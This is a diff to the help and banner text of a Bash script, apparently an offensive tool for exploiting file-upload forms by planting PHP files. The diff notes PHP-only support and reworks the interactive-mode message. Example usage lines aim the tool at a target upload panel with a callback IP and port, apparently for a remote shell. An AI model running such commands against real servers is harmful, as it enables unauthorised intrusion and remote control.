@@ -21,13 +21,26 @@ Uploader will run in interactive mode if you don't supply a value for required p
 [Example Usage]
 	./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png
 	./uploader.sh -u http://10.10.40.117/panel/ -n fileUpload -b
+
+[Supported File Types]
+
+Currently, Uploader only supports PHP files. More file types will be added in subsequent updates.
+
 EOF
 
 }
 
 if [ $# -eq 0 ]
 then
-        echo -e "\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"
+  cat <<EOF
+
+[+] Uploader only supports arguments when used as a standalone script. Support for arguments when launched from Ares will be added in the future.
+
+No arguments provided. Defaulting to interactive mode.
+
+[!] Tip: Use the -h argument to view the help menu
+
+EOF
 
 else
 	while getopts ":hi:p:u:n:e:a:b" option; do
